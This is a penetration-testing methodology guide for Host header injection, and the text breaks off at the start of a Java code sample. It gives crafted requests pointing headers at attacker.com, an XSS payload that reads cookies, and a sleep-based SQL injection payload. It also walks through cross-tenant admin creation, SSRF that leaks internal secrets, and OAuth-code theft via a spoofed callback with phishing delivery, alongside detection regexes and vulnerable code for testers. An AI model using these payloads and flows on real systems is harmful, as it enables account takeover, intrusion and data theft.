# Host Header Injection

## Check List

## Methodology

### Black Box

#### Spoofing with a Malicious Domain

{% stepper %}
{% step %}
Modify the Host header to include a rogue domain (e.g., attacker.com) to test if the application generates links, redirects, or emails pointing to the malicious domain, potentially enabling cache poisoning or password reset poisoning, like this Request

```http
GET /reset-password HTTP/1.1  
Host: attacker.com
```
{% endstep %}

{% step %}
Send HTTP requests with the altered Host header and monitor responses for references to the rogue domain in links, redirects, or email content
{% endstep %}

{% step %}
{% hint style="info" %}
The important point is that this vulnerability must be tested in the forgotten password functionality, this is usually a good point to test this vulnerability
{% endhint %}
{% endstep %}
{% endstepper %}

***

#### Adding a Prefix to the Host Header

{% stepper %}
{% step %}
Prepend a malicious prefix to the target domain (e.g., attackertarget.com) to trick the application into processing requests as if they originate from a legitimate domain,&#x20;

```http
GET /admin.php HTTP/1.1
Host: attackertarget.com
```
{% endstep %}

{% step %}
Analyze responses for generated URLs or redirects that include the prefixed domain, indicating a bypass of host validation
{% endstep %}
{% endstepper %}

***

#### Using Absolute URL Path in Host Header

{% stepper %}
{% step %}
Inject a full URL (e.g., https://target.com/admin.php) into the Host header to exploit applications that parse it as part of the request path, potentially bypassing filters or confusing backend logic

```http
GET /admin.php HTTP/1.1
Host: https://target.com/admin.php
```
{% endstep %}

{% step %}
Check for server errors, redirects, or unexpected responses that suggest improper parsing of the Host header
{% endstep %}
{% endstepper %}

***

#### Subdomain-Based Host Injection

{% stepper %}
{% step %}
Supply a subdomain of the target (e.g., subdomain.target.com) to test if weak validation allows access to restricted resources or bypasses access controls

```http
GET /admin.php HTTP/1.1
Host: subdomain.target.com
```
{% endstep %}

{% step %}
Monitor responses for successful access to protected pages or data leaks, indicating a failure in subdomain-specific validation
{% endstep %}
{% endstepper %}

***

#### Injecting Leading Spaces or Tabs

{% stepper %}
{% step %}
Add leading spaces or tabs to the Host header to exploit inconsistent header parsing by servers or proxies, potentially causing misrouting or access to unintended resources

```http
GET /admin.php HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Observe response differences, such as routing to default virtual hosts or error pages, to identify parsing vulnerabilities
{% endstep %}
{% endstepper %}

***

#### Specifying a Non-Standard Port

{% stepper %}
{% step %}
Include a port in the Host header (e.g., target.com:8080) to test if the application bypasses host-based access controls or misroutes requests due to port-specific logic

```http
GET /admin.php HTTP/1.1
Host: target.com:8080
```
{% endstep %}

{% step %}
Analyze responses for changes in routing, error codes, or access to restricted endpoints, indicating potential misconfigurations
{% endstep %}
{% endstepper %}

***

#### Manipulating X-Forwarded-Host Header

{% stepper %}
{% step %}
Inject a malicious domain into the X-Forwarded-Host header to test if proxies or applications trust it over the Host header, potentially redirecting requests to attacker-controlled servers

```http
GET /admin.php HTTP/1.1
X-Forwarded-Host: attacker.com
```
{% endstep %}

{% step %}
Check for responses that include the malicious domain in links, redirects, or API calls, confirming improper header handling
{% endstep %}
{% endstepper %}

***

#### Using Server’s IP Address

{% stepper %}
{% step %}
Replace the domain in the Host header with the server’s IP address to bypass virtual host routing or access controls, potentially accessing default or unintended virtual hosts.

```http
GET /admin.php HTTP/1.1
Host: <target IP>
```
{% endstep %}

{% step %}
Monitor responses for exposed resources or different content served compared to the domain-based request
{% endstep %}
{% endstepper %}

***

#### Empty Host Header Testing

{% stepper %}
{% step %}
Send a blank Host header to test if the server defaults to the first virtual host or exhibits unexpected behavior, potentially exposing sensitive resources

```http
GET /admin.php HTTP/1.1
Host: 
```
{% endstep %}

{% step %}
Analyze responses for default pages, error messages, or access to unintended virtual hosts, indicating misconfigured server logic
{% endstep %}
{% endstepper %}

***

#### Multiple Host Headers

{% stepper %}
{% step %}
Send multiple Host headers with conflicting values (e.g., target.com and attacker.com) to exploit inconsistencies between frontend and backend parsing, potentially bypassing validation

```http
GET /admin.php HTTP/1.1
Host: target.com
Host: attacker.com
```
{% endstep %}

{% step %}
Check for responses that prioritize the malicious Host header, leading to redirects, links, or data exposure to attacker-controlled domains
{% endstep %}
{% endstepper %}

***

#### Targeting Another Site on the Same IP

{% stepper %}
{% step %}
Identify other domains hosted on the same IP and inject one into the Host header to test for access to unintended resources or data from co-hosted sites

```http
GET /admin.php HTTP/1.1
Host: target2.com
```
{% endstep %}

{% step %}
Monitor responses for content from the alternate domain, indicating improper virtual host isolation or shared resource exposure
{% endstep %}
{% endstepper %}

***

#### Host Header Injection in SSRF

{% stepper %}
{% step %}
Inject an internal hostname (e.g., internal-service.local) into the Host header to test for SSRF vulnerabilities, bypassing filters that rely on Host header validation

```http
Host: internal-service.local
```
{% endstep %}

{% step %}
Analyze responses for access to internal APIs, metadata services, or restricted endpoints, confirming SSRF exploitability
{% endstep %}
{% endstepper %}

***

#### DNS Rebinding via Host Header

{% stepper %}
{% step %}
Use a rebinding domain (e.g., rebinding.attacker.com) in the Host header to trick the application into processing requests that bypass same-origin or network protections

```http
Host: rebinding.attacker.com
```
{% endstep %}

{% step %}
Test for responses that allow access to internal resources or violate same-origin policies, leveraging DNS rebinding services for validation
{% endstep %}
{% endstepper %}

***

#### Injecting Special Characters in Host Header

{% stepper %}
{% step %}
Insert special characters (e.g., null bytes, CRLF, or Unicode) into the Host header to bypass validation filters or trigger parsing errors that expose sensitive functionality

```http
GET /admin.php HTTP/1.1
Host: target.com%00.attacker.com
```
{% endstep %}

{% step %}
Monitor responses for errors, misrouting, or unexpected access to resources, indicating filter bypass vulnerabilities
{% endstep %}
{% endstepper %}

***

#### Path Traversal in Host Header

{% stepper %}
{% step %}
Inject path traversal sequences (e.g., ../../attacker.com) into the Host header to test if the application misinterprets it as part of the request path, leading to unintended behavior

```http
GET /admin.php HTTP/1.1
Host: ../../attacker.com
```
{% endstep %}

{% step %}
Analyze responses for path traversal effects, such as access to restricted endpoints or server errors, indicating parsing vulnerabilities
{% endstep %}
{% endstepper %}

***

#### Encoded Host Header Values

{% stepper %}
{% step %}
Use URL-encoded or double-encoded values in the Host header (e.g., %74%61%72%67%65%74.com) to bypass validation mechanisms or confuse parsing logic

```http
GET /admin.php HTTP/1.1
Host: %74%61%72%67%65%74.com
```
{% endstep %}

{% step %}
Check for responses that process the encoded header as valid, potentially leading to redirects or access to attacker-controlled domains
{% endstep %}
{% endstepper %}

***

#### Chaining X-Forwarded Headers for Injection

{% stepper %}
{% step %}
Inject malicious payloads into X-Forwarded-Host or X-Forwarded-For headers to test for XSS or SQL injection vulnerabilities, exploiting improper header handling in frontend or backend systems

```http
X-Forwarded-Host: evil.com"><img src/onerror=prompt(document.cookie)>

X-Forwarded-Host: 0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
```
{% endstep %}

{% step %}
Monitor responses for script execution (e.g., XSS via prompt(document.cookie)) or delayed responses (e.g., SQLi via sleep-based payloads), confirming injection success
{% endstep %}
{% endstepper %}

***

#### Host Header Injection via Account Takeover

{% stepper %}
{% step %}
Intercept the password reset request using a proxy tool to capture headers, parameters, and body content, identifying the structure of the request sent to the server
{% endstep %}

{% step %}
Analyze the Host header and related headers like Origin or Referer to understand how the application processes domain inputs during the password reset flow
{% endstep %}

{% step %}
Examine the request body for parameters such as username or email to confirm the data triggering the reset link generation
{% endstep %}

{% step %}
Modify the Host header with a malicious domain (e.g., attacker.com) to test if the server reflects it in the password reset link sent to the user’s email
{% endstep %}

{% step %}
Send the modified request and check the email for the reset link, noting if the malicious domain appears in the URL or token path
{% endstep %}

{% step %}
Document the reset link’s URL and token, assessing whether it points to the attacker-controlled domain and is clickable
{% endstep %}

{% step %}
Test appending a malicious prefix to the target domain (e.g., attacker.login.redacted.com) in the Host header to bypass domain validation checks
{% endstep %}

{% step %}
Submit the request and verify if the reset link reflects the prefixed domain, checking for server-side truncation or errors (e.g., stripping .com from the prefix)
{% endstep %}

{% step %}
Evaluate if the resulting link leads to an inaccessible host or “site can’t be reached” error, indicating partial validation by the server
{% endstep %}

{% step %}
Inject a malicious domain with a colon separator (e.g., attacker.com:login.redacted.com) in the Host header to exploit improper parsing of domain components
{% endstep %}

{% step %}
Send the request and monitor the email for a reset link containing the malicious domain in its correct form (e.g., https://attacker.com/...)
{% endstep %}

{% step %}
Verify if clicking the link triggers an HTTP pingback to an attacker-controlled server (e.g., Burp Collaborator), confirming token leakage
{% endstep %}

{% step %}
Document the exact Host header manipulation (e.g., colon injection), the resulting reset link, and any received pingbacks with tokens for proof-of-concept
{% endstep %}

{% step %}
Test additional headers like X-Forwarded-Host with a malicious domain to check if the server prioritizes it over the Host header in the reset link generation
{% endstep %}

{% step %}
Analyze server responses for inconsistencies in domain handling, noting any bypasses that result in a functional reset link pointing to the attacker’s domain
{% endstep %}

{% step %}
Reproduce the attack multiple times to confirm reliability, ensuring the manipulation consistently delivers a usable reset token to the attacker
{% endstep %}
{% endstepper %}

***

### White Box

#### Cross-Tenant Database Poisoning via White-Label Domain Resolution Asymmetry

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on multi-tenant SaaS platforms that heavily utilize Custom Domains (CNAMEs) or White-Labeling (e.g., `tenantA.platform.com`, `client-custom-domain.com`)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind.
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Dynamic Tenant Resolution" architecture. In hyper-scale SaaS applications, hardcoding thousands of custom domain mappings into the API Gateway's routing table requires constant re-deployments
{% endstep %}

{% step %}
Investigate the routing optimization: To support frictionless onboarding of custom domains, the backend microservices dynamically deduce the target tenant's database connection string at runtime by inspecting the HTTP `Host` header
{% endstep %}

{% step %}
Analyze the perimeter security architecture. The enterprise API Gateway terminates external TLS, validates the user's JSON Web Token (JWT), and proxies the request to the internal microservice mesh
{% endstep %}

{% step %}
Discover the architectural desynchronization: The API Gateway authorizes the JWT based on the standard `Host` header or the JWT's internal `iss`/`aud` claims. However, to preserve the original client domain through the reverse proxy network, the Gateway appends the `X-Forwarded-Host` header
{% endstep %}

{% step %}
Locate the `TenantContextMiddleware` in the decompiled downstream microservice
{% endstep %}

{% step %}
Understand the framework's native header prioritization: To natively support reverse proxies, many web frameworks (e.g., ASP.NET Core `UseForwardedHeaders`, Spring Boot `ForwardedHeaderFilter`) automatically overwrite the internal request's `Host` property with the value of the `X-Forwarded-Host` header
{% endstep %}

{% step %}
Recognize the fatal execution gap: The API Gateway mathematically verified that the user is authorized to access `Tenant_A`. However, the downstream microservice resolves the database connection string using the overwritten, unverified `X-Forwarded-Host` header
{% endstep %}

{% step %}
Formulate the Cross-Tenant Injection payload. Authenticate to the application as a standard user for `Tenant_A`
{% endstep %}

{% step %}
Construct a request designed to write data (e.g., `POST /api/v1/users` to create a new administrative user)
{% endstep %}

{% step %}
Inject the `X-Forwarded-Host: target-victim-tenant.platform.com` header into the request alongside the legitimate `Host: tenant-a.platform.com` header
{% endstep %}

{% step %}
The API Gateway receives the request, evaluates the primary `Host` and JWT, confirms you are a valid user of `Tenant_A`, and forwards the request internally
{% endstep %}

{% step %}
The downstream microservice receives the request, prioritizes the injected `X-Forwarded-Host`, dynamically switches the Entity Framework/Hibernate database context to `Tenant_B`, and writes your attacker-controlled administrative user directly into the victim's isolated database

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bTenantContext\.SetTenant\([^,]+,\s*Request\.Headers\["X-Forwarded-Host"\]\)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\bTenantResolver\.resolve\(request\.getHeader\("X-Forwarded-Host"\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bconfig\('database\.connections\.'\s*\.\s*\$request->header\('X-Forwarded-Host'\)\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\bdbResolver\.getConnection\(req\.headers\['x-forwarded-host'\]\)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
TenantContext\.SetTenant\([^,]+,\s*Request\.Headers\["X-Forwarded-Host"\]
```
{% endtab %}

{% tab title="Java" %}
```regexp
TenantResolver\.resolve\(request\.getHeader\("X-Forwarded-Host"\)\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
config\('database\.connections\.'\s*\.\s*\$request->header\('X-Forwarded-Host'\)\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
dbResolver\.getConnection\(req\.headers\['x-forwarded-host'\]\)
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class TenantResolutionMiddleware 
{
    private readonly ITenantRepository _tenantRepo;

    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        // [1]
        // [2]
        // ASP.NET Core UseForwardedHeaders() automatically maps X-Forwarded-Host to Request.Host
        var requestedDomain = context.Request.Host.Value; 

        // [3]
        var tenant = await _tenantRepo.GetTenantByDomainAsync(requestedDomain);

        if (tenant != null) 
        {
            // [4]
            var dbContext = context.RequestServices.GetRequiredService<ApplicationDbContext>();
            dbContext.Database.SetConnectionString(tenant.DatabaseConnectionString);
            
            context.Items["TenantContext"] = tenant;
        }

        await next(context);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class TenantResolutionFilter implements Filter {

    @Autowired
    private TenantRepository tenantRepo;

    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {
        HttpServletRequest req = (HttpServletRequest) request;

        // [1]
        // [2]
        // Spring's ForwardedHeaderFilter transparently overwrites req.getServerName() with X-Forwarded-Host
        String requestedDomain = req.getServerName();

        // [3]
        Tenant tenant = tenantRepo.findByDomain(requestedDomain);

        if (tenant != null) {
            // [4]
            TenantContextHolder.setTenantId(tenant.getId());
            DataSourceContextHolder.setDataSource(tenant.getDbIdentifier());
        }

        try {
            chain.doFilter(request, response);
        } finally {
            TenantContextHolder.clear();
            DataSourceContextHolder.clear();
        }
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class TenantResolutionMiddleware 
{
    protected $tenantRepo;

    public function handle(Request $request, Closure $next) 
    {
        // [1]
        // [2]
        // Symfony/Laravel TrustProxies middleware transparently maps X-Forwarded-Host to getHost()
        $requestedDomain = $request->getHost();

        // [3]
        $tenant = $this->tenantRepo->findByDomain($requestedDomain);

        if ($tenant) {
            // [4]
            Config::set('database.connections.tenant.database', $tenant->database_name);
            DB::purge('tenant');
            DB::reconnect('tenant');
            DB::setDefaultConnection('tenant');
        }

        return $next($request);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class TenantResolutionMiddleware {
    static async handle(req, res, next) {
        // [1]
        // [2]
        // Express 'trust proxy' setting maps X-Forwarded-Host to req.hostname
        let requestedDomain = req.hostname;

        // [3]
        let tenant = await tenantRepo.findByDomain(requestedDomain);

        if (tenant) {
            // [4]
            req.tenantContext = tenant;
            req.dbConnection = await dbPool.getConnection(tenant.databaseConfig);
        }

        next();
    }
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on the HTTP `Host` header to dynamically resolve multi-tenant database contexts, allowing infinite scaling of white-labeled custom domains without modifying routing infrastructure, \[2] To survive transit through complex reverse-proxy meshes and API Gateways, the backend application explicitly enables "Trust Proxy" middleware. This middleware automatically rewrites the internal request's `Host` property using the external `X-Forwarded-Host` header, \[3] The microservice queries its central registry to find the specific tenant matching the spoofed domain, \[4] The fatal execution sink. The microservice dynamically alters the application's global database connection string for the duration of the request thread. Because the upstream Gateway successfully validated the JWT but ignored the `X-Forwarded-Host` header, the attacker achieves an authenticated state mutation inside an entirely isolated cross-tenant database environment

```http
// 1. Attacker is a low-privilege user in Tenant_A.
// 2. Attacker crafts a request to create a new administrative user, injecting the target victim's domain into the X-Forwarded-Host header.

POST /api/v1/users HTTP/1.1
Host: tenant-a.platform.tld
X-Forwarded-Host: target-victim.platform.tld
Authorization: Bearer <tenant_a_valid_jwt>
Content-Type: application/json

{
  "email": "attacker@evil.com",
  "role": "SuperAdmin",
  "password": "Password123!"
}

// 3. API Gateway authorizes the JWT against "tenant-a.platform.tld". Access Granted.
// 4. Downstream microservice's "Trust Proxy" middleware rewrites internal Host to "target-victim.platform.tld".
// 5. Downstream microservice establishes database connection to Target Victim's database.
// 6. Entity Framework / Hibernate executes the INSERT statement, creating the SuperAdmin.

HTTP/1.1 201 Created
{
  "status": "User Created in target-victim.platform.tld context"
}
```
{% endstep %}

{% step %}
To support frictionless custom domain onboarding, the enterprise architected a dynamic tenant resolution pipeline. By enabling native reverse-proxy support frameworks (like `UseForwardedHeaders`), they optimized internal routing but inadvertently decoupled the authentication boundary from the data-resolution boundary. The API Gateway correctly authenticated the user against the physical `Host` header, mathematically proving their identity within their own tenant. However, the downstream microservice blindly trusted the `X-Forwarded-Host` header to establish the database connection string. The attacker exploited this asymmetric evaluation by smuggling a target domain into the proxy headers. The downstream service shifted the execution thread's active database context to the victim organization, allowing the attacker to persist high-privilege configuration records across strictly isolated physical database boundaries
{% endstep %}
{% endstepper %}

***

#### Internal Microservice SSRF via Isomorphic Rendering Loopback Synthesis

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on modern frontend applications utilizing Server-Side Rendering (SSR) frameworks (e.g., Next.js, Nuxt, Angular Universal, or custom .NET Blazor/Java MVC architectures)
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the "Isomorphic SSR" architecture. To ensure optimal SEO and fast Time-To-Interactive (TTI), the application executes the frontend JavaScript/UI components on the backend server, rendering a complete HTML DOM string before sending it to the client's browser
{% endstep %}

{% step %}
Investigate the Data Hydration optimization. During the server-side rendering phase, the UI components must fetch data (e.g., user profile, product details) from the internal API microservices to populate the HTML
{% endstep %}

{% step %}
Discover the loopback routing bottleneck: In highly ephemeral Kubernetes environments, hardcoding the internal loopback URL (e.g., `http://localhost:8080/api`) breaks when the SSR server and the API server are separated into different pods or deployed across diverse staging environments
{% endstep %}

{% step %}
Analyze the URL synthesis logic within the SSR data-fetching functions. To avoid complex environment variable management, the developer dynamically reconstructs the absolute API URL by reading the incoming HTTP `Host` header (e.g., `fetch($"https://{Request.Host}/api/v1/products")`)
{% endstep %}

{% step %}
Understand the architectural assumption: The developer explicitly assumes that the `Host` header represents the legitimate public domain of the application, forcing the SSR server to act as a standard web client querying its own public API
{% endstep %}

{% step %}
Recognize the server-side execution sink: Because this request originates from the backend SSR server (which is deeply embedded inside the trusted corporate DMZ), it possesses the capability to bypass external firewalls, WAFs, and perimeter authentication gateways
{% endstep %}

{% step %}
Formulate the Internal SSRF payload. Intercept a standard page-load request that triggers server-side rendering (e.g., `GET /dashboard`)
{% endstep %}

{% step %}
Inject an internal microservice hostname into the `Host` header (e.g., `Host: internal-billing-api.svc.cluster.local`)
{% endstep %}

{% step %}
The SSR server receives the request. During the React/Vue component lifecycle, the `getServerSideProps` or equivalent initialization method triggers
{% endstep %}

{% step %}
The SSR engine string-interpolates your spoofed `Host` header to build the absolute API URL: `[http://internal-billing-api.svc.cluster.local/api/v1/products](http://internal-billing-api.svc.cluster.local/api/v1/products)`
{% endstep %}

{% step %}
The SSR backend server natively executes the HTTP request against the highly classified internal microservice
{% endstep %}

{% step %}
Crucially, the SSR engine receives the internal microservice's JSON response, binds it to the UI components, renders the DOM, and returns the raw HTML. You have successfully weaponized the frontend rendering engine to exfiltrate internal cluster data directly into your browser's HTML source code

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bHttpClient\.GetAsync\(\s*\$"https?:\/\/\{Request\.Host\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
\brestTemplate\.getForObject\(\s*"https?:\/\/"\s*\+\s*request\.getHeader\("Host"\)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\bfile_get_contents\(\s*"https?:\/\/"\s*\.\s*\$request->getHost\(\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\bfetch\(\s*`https?:\/\/\$\{req\.headers\.host\}\/
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
HttpClient\.GetAsync\(\$"http[s]?://\{Request\.Host\}
```
{% endtab %}

{% tab title="Java" %}
```regexp
restTemplate\.getForObject\("http[s]?://"\s*\+\s*request\.getHeader\("Host"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
file_get_contents\("http[s]?://"\s*\.\s*\$request->getHost\(\)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
fetch\(`http[s]?://\$\{req\.headers\.host\}/
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SsrDashboardModel : PageModel
{
    private readonly HttpClient _httpClient;

    public string DashboardData { get; set; }

    public async Task OnGetAsync()
    {
        // [1]
        // [2]
        var host = Request.Host.Value;

        // [3]
        // [4]
        // The SSR engine must make an HTTP request to its own API to pre-render the view.
        var loopbackUrl = $"http://{host}/api/v1/dashboard/metrics";
        
        var response = await _httpClient.GetAsync(loopbackUrl);
        
        // Binds the response directly into the HTML template
        DashboardData = await response.Content.ReadAsStringAsync(); 
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Controller
public class SsrDashboardController {

    @Autowired
    private RestTemplate restTemplate;

    @GetMapping("/dashboard")
    public String renderDashboard(HttpServletRequest request, Model model) {
        // [1]
        // [2]
        String host = request.getHeader("Host");

        // [3]
        // [4]
        String loopbackUrl = "http://" + host + "/api/v1/dashboard/metrics";
        
        String dashboardData = restTemplate.getForObject(loopbackUrl, String.class);
        
        // Binds the response directly into the Thymeleaf/JSP template
        model.addAttribute("DashboardData", dashboardData);
        
        return "dashboardView";
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class SsrDashboardController extends Controller
{
    public function renderDashboard(Request $request)
    {
        // [1]
        // [2]
        $host = $request->getHost();

        // [3]
        // [4]
        $loopbackUrl = "http://{$host}/api/v1/dashboard/metrics";
        
        // Disabling SSL verification for local SSR loopbacks is a common anti-pattern
        $dashboardData = file_get_contents($loopbackUrl);
        
        // Binds the response directly into the Blade/Twig template
        return view('dashboardView', ['DashboardData' => $dashboardData]);
    }
}
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
// Next.js / Express Isomorphic Data Fetching example
export async function getServerSideProps(context) {
    // [1]
    // [2]
    const host = context.req.headers.host;

    // [3]
    // [4]
    const loopbackUrl = `http://${host}/api/v1/dashboard/metrics`;
    
    const response = await fetch(loopbackUrl);
    const dashboardData = await response.text();

    // Binds the response directly into the React component props
    return {
        props: {
            DashboardData: dashboardData
        }
    };
}
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The architecture relies on Server-Side Rendering (SSR) to generate fully populated HTML documents before returning them to the client, requiring the backend server to act as an HTTP client querying its own APIs, \[2] To avoid managing complex environment variables across ephemeral Docker containers, the developer dynamically extracts the current environment's domain from the incoming `Host` header, \[3] The architecture assumes the `Host` header strictly represents the public-facing domain (e.g., `app.enterprise.com`), \[4] The execution sink. The SSR backend server utilizes the attacker-controlled `Host` header to synthesize the absolute URI for its data-fetching routine. By supplying an internal cluster hostname (e.g., `kubernetes-dashboard.kube-system.svc`), the attacker forces the highly trusted SSR server to execute an internal HTTP GET request. The resulting sensitive telemetry is blindly embedded into the returned HTML DOM, perfectly exfiltrating isolated network data directly to the attacker's browser

```http
// 1. Attacker interacts with a publicly accessible SSR page (e.g., the Login page, or a public Dashboard).
// 2. Attacker manipulates the Host header to target an internal microservice running on port 8080.
// They append the required URI path to the end of the Host header to exploit the URL synthesis.

GET /dashboard HTTP/1.1
Host: internal-payments-api.svc.cluster.local:8080/admin/health?
Authorization: Bearer <low_privilege_token>
Connection: close

// 3. The SSR Backend receives the request and constructs the loopback URL:
// fetch("http://internal-payments-api.svc.cluster.local:8080/admin/health?/api/v1/dashboard/metrics")

// 4. The SSR Backend executes the request. The internal API ignores the query parameter (which neutralized the hardcoded path) 
// and returns the highly classified health and metrics data.

// 5. The SSR engine renders the React/Vue template and returns the HTML:
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<body>
    <div id="dashboard-root">
        {"status":"UP","database_connection":"Server=tcp:internal.db;Password=SuperSecret;"}
    </div>
</body>
</html>
```
{% endstep %}

{% step %}
To ensure dynamic frontend frameworks could successfully render HTML on the backend without brittle environment configurations, developers implemented Isomorphic Loopback Synthesis. By dynamically extracting the base URL from the incoming `Host` header, the SSR engine could seamlessly query its own API regardless of the deployment environment. The architectural failure occurred because the SSR engine operates deep within the trusted corporate network, completely bypassing perimeter firewalls. The attacker exploited the dynamic URL synthesis by injecting internal Kubernetes DNS addresses into the `Host` header. The SSR server blindly honored the injected host, executed the HTTP request against the internal, unauthenticated administrative microservice, and obediently rendered the highly classified JSON response directly into the public-facing HTML document
{% endstep %}
{% endstepper %}

***

#### Zero-Click Account Takeover via Dynamic White-Label SSO Callback Synthesis

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus on global Identity Providers (IdPs) or massive B2B platforms offering Single Sign-On (SSO) integration via OAuth2, OIDC, or SAML 2.0
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Centralized Identity Broker architecture. Large platforms operate a unified authentication microservice that handles logins for thousands of distinct customer subdomains (e.g., `tenant1.platform.com`, `tenant2.platform.com`)
{% endstep %}

{% step %}
Investigate the OAuth2/SAML initialization logic. When a user clicks "Login with Microsoft" or "Login with Okta", the platform must redirect the user to the external IdP. This redirect must include a `redirect_uri` (Callback URL) telling the IdP where to send the user back after successful authentication
{% endstep %}

{% step %}
Discover the "Frictionless Onboarding" optimization. Maintaining a static registry of 50,000 allowed `redirect_uri` strings inside the external IdP configuration is an administrative nightmare. To bypass this, platform engineers configure the external IdP to accept wildcard subdomains (e.g., `*[.platform.com/callback](https://.platform.com/callback)`)
{% endstep %}

{% step %}
Analyze the Callback Synthesis engine in the decompiled code. Because the external IdP accepts wildcards, the internal Identity Broker must dynamically generate the exact `redirect_uri` string to include in the outbound OAuth authorization request
{% endstep %}

{% step %}
Locate the synthesis mechanism: The developer builds the `redirect_uri` by dynamically concatenating the incoming HTTP `Host` header (e.g., `$"https://{Request.Host}/api/sso/callback"`)
{% endstep %}

{% step %}
Understand the architectural assumption: The developer assumes that because the user is actively browsing `tenant-a.platform.com`, the `Host` header will securely route the OAuth authorization code back to the correct tenant application
{% endstep %}

{% step %}
Recognize the fatal logic sequence: The attacker can initiate the SSO flow on behalf of a victim, spoof the `Host` header, and force the Identity Broker to synthesize a malicious callback URL
{% endstep %}

{% step %}
Formulate the dynamic callback hijacking payload. The attacker navigates to the platform's login initialization endpoint (e.g., `/api/auth/login/azure`)
{% endstep %}

{% step %}
Intercept the request and modify the `Host` header to point to an attacker-controlled domain (e.g., `Host: attacker-controlled-domain.com`)
{% endstep %}

{% step %}
The Identity Broker receives the request, reads the spoofed `Host` header, and generates the outbound OAuth authorization URL:\
`[https://login.microsoftonline.com/...&redirect_uri=https://attacker-controlled-domain.com/api/sso/callback](https://login.microsoftonline.com/...&redirect_uri=https://attacker-controlled-domain.com/api/sso/callback)`
{% endstep %}

{% step %}
The attacker copies this generated Azure/Okta authorization URL and delivers it to the target victim (via phishing, a hidden `<iframe>`, or forced redirect)
{% endstep %}

{% step %}
The victim, already authenticated to Azure/Okta, clicks the link. The external IdP silently issues the OAuth authorization code and automatically redirects the victim to the `redirect_uri`. Because the URI was synthesized using the spoofed Host header, the victim's browser transmits the highly sensitive OAuth code directly to the attacker's server, resulting in a zero-click Account Takeover

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\bRedirectUri\s*=\s*\$"https:\/\/\{Request\.Host\}\/[^"]*callback"
```
{% endtab %}

{% tab title="Java" %}
```regexp
\bredirectUri\s*=\s*"https:\/\/"\s*\+\s*request\.getServerName\(\)\s*\+\s*"\/[^"]*callback"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b\$redirectUri\s*=\s*"https:\/\/"\s*\.\s*\$request->getHost\(\)\s*\.\s*"\/.*callback"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\bredirect_uri\s*=\s*`https:\/\/\$\{req\.headers\['host'\]\}\/.*callback`
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
RedirectUri\s*=\s*\$"https://\{Request\.Host\}/.*callback"
```
{% endtab %}

{% tab title="Java" %}
```regexp
redirectUri\s*=\s*"https://"\s*\+\s*request\.getServerName\(\)\s*\+\s*"/.*callback"
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$redirectUri\s*=\s*"https://"\s*\.\s*\$request->getHost\(\)\s*\.\s*"/.*callback"
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
redirect_uri\s*=\s*`https://\$\{req\.headers\['host'\]\}/.*callback`
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class SsoAuthenticationController : Controller
{
    [HttpGet("/api/auth/login/{provider}")]
    public IActionResult InitiateSsoLogin(string provider)
    {
        // [1]
        // [2]
        var requestedHost = Request.Host.Value;

        // [3]
        // [4]
        var redirectUri = $"https://{requestedHost}/api/auth/callback/{provider}";
        
        var oauthState = GenerateSecureState();
        
        var authorizationUrl = $"https://idp.external.com/authorize?" +
                               $"client_id=global_client_id&" +
                               $"response_type=code&" +
                               $"redirect_uri={UrlEncoder.Default.Encode(redirectUri)}&" +
                               $"state={oauthState}";

        return Redirect(authorizationUrl);
    }
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Controller
public class SsoAuthenticationController {

